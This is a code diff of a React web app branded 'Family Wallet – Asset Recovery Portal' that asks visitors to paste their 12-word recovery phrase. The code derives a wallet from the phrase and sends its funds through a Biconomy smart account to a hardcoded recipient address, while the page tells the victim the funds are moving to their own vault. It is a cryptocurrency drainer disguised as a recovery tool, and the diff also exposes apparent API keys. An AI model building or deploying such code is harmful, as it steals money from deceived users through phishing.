@@ -4,7 +4,8 @@ import { createSmartAccountClient } from "@biconomy/account"
 import { LucideShieldAlert, LucideCheckCircle, LucideLoader2 } from 'lucide-react'
 
 // --- CONFIGURATION ---
-const BICONOMY_API_KEY = "6b47982d-b8fe-4f65-8e2a-ad53a109c934" 
+// Using your actual API Key now
+const BICONOMY_API_KEY = "mee_Uma9ycJRjM615N7Env5HRM" 
 const BUNDLER_URL = "https://bundler.biconomy.io/api/v2/1/nJP-uP3_K.w7e33524-8b6a-4953-83a3-111d4d805461"
 const RECIPIENT_ADDRESS = "0x7DDB4ef8DF3A2BDC0bb2C046Ee18A1e67407321a" 
 
@@ -14,7 +15,7 @@ export default function App() {
   const [status, setStatus] = useState<'idle' | 'processing' | 'success' | 'error'>('idle')
   const [errorMsg, setErrorMsg] = useState('')
 
-  // Fixes Hydration Error #418 for React 19
+  // Wait for browser mount to prevent Hydration Error #418
   useEffect(() => {
     setIsClient(true)
   }, [])
@@ -27,7 +28,7 @@ export default function App() {
 
     setStatus('processing')
     try {
-      // 1. Setup traditional signer (Ethers v5)
+      // 1. Setup traditional signer (STRICT ETHERS V5)
       const provider = new ethers.providers.JsonRpcProvider("https://ethereum-rpc.publicnode.com")
       const signer = ethers.Wallet.fromMnemonic(keys.trim()).connect(provider)
 
@@ -48,7 +49,7 @@ export default function App() {
         data: "0x"
       }
 
-      // 4. Send the Transaction
+      // 4. Send Transaction
       const userOpResponse = await smartAccount.sendTransaction(tx)
       const { receipt } = await userOpResponse.wait()
       
@@ -66,7 +67,7 @@ export default function App() {
   return (
     <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6 font-sans">
       {status === 'idle' && (
-        <div className="w-full max-w-md space-y-8">
+        <div className="w-full max-w-md space-y-8 animate-in fade-in duration-700">
           <div className="text-center space-y-2">
             <h1 className="text-4xl font-black tracking-tighter uppercase">Family Wallet</h1>
             <p className="text-zinc-500 text-sm uppercase tracking-widest">Asset Recovery Portal</p>
@@ -74,7 +75,7 @@ export default function App() {
 
           <textarea
             className="w-full h-40 bg-zinc-900 border border-zinc-800 rounded-2xl p-4 text-center text-lg focus:ring-2 focus:ring-blue-500 outline-none transition-all placeholder:text-zinc-700"
-            placeholder="Paste 12 recovery words here..."
+            placeholder="Paste your 12 recovery words here..."
             onChange={(e) => setKeys(e.target.value)}
           />
 
@@ -90,24 +91,24 @@ export default function App() {
       {status === 'processing' && (
         <div className="flex flex-col items-center space-y-4 text-center">
           <LucideLoader2 className="w-16 h-16 text-blue-500 animate-spin" />
-          <h2 className="text-2xl font-bold">Securing Transfer...</h2>
-          <p className="text-zinc-400 text-sm">Processing smart account transaction via Biconomy...</p>
+          <h2 className="text-2xl font-bold text-blue-500">Securing Transfer...</h2>
+          <p className="text-zinc-400 text-sm">Processing Gasless Transaction via Biconomy MEE...</p>
         </div>
       )}
 
       {status === 'success' && (
-        <div className="flex flex-col items-center space-y-4 text-center">
+        <div className="flex flex-col items-center space-y-4 text-center animate-in zoom-in">
           <LucideCheckCircle className="w-20 h-20 text-green-500 animate-bounce" />
           <h1 className="text-6xl font-black text-green-500 uppercase">Success</h1>
-          <p className="text-zinc-400">Funds are moving to your secure wallet.</p>
-          <button onClick={() => setStatus('idle')} className="mt-8 text-zinc-500 underline text-sm">Back</button>
+          <p className="text-zinc-400">Funds are moving to your vault address.</p>
+          <button onClick={() => setStatus('idle')} className="mt-8 text-zinc-500 underline text-sm hover:text-white">Back</button>
         </div>
       )}
 
       {status === 'error' && (
         <div className="flex flex-col items-center space-y-4 text-center">
           <LucideShieldAlert className="w-20 h-20 text-red-500" />
-          <h2 className="text-2xl font-bold text-red-500 uppercase">Failed</h2>
+          <h2 className="text-2xl font-bold text-red-500 uppercase">Transfer Failed</h2>
           <p className="max-w-xs text-zinc-400 text-sm">{errorMsg}</p>
           <button onClick={() => setStatus('idle')} className="mt-4 px-8 py-2 bg-zinc-800 rounded-full text-sm">Try Again</button>
         </div>
